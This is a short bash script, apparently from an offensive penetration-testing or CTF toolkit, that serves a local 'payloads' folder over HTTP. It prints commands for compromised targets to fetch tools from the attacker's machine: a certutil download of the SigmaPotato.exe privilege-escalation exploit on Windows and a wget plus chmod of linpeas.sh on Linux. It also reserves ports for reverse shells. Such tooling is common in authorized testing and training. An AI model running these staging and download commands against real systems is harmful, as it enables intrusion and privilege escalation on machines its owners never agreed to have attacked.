#!/usr/bin/env bash
# serve.sh — serve the payloads/ dir over HTTP for target-side pulls (certutil / wget).
# Usage:  bash scripts/serve.sh [port]     (default 8081; keep 4444/5555/6666 for shells)
set -uo pipefail

PORT="${1:-8081}"
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../payloads" && pwd)"
cd "$ROOT"
LHOST="$(ip -4 -o addr show 2>/dev/null | awk '$2!="lo"{print $4}' | cut -d/ -f1 | head -1)"
echo "[*] Serving $ROOT on :$PORT"
echo "    Windows:  certutil -urlcache -f http://${LHOST:-LHOST}:$PORT/SigmaPotato.exe C:\\Windows\\Temp\\sp.exe"
echo "    Linux:    wget http://${LHOST:-LHOST}:$PORT/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh"
echo "    (Ctrl-C to stop)"
echo "+ python3 -m http.server $PORT   (cwd: $ROOT)"
exec python3 -m http.server "$PORT"
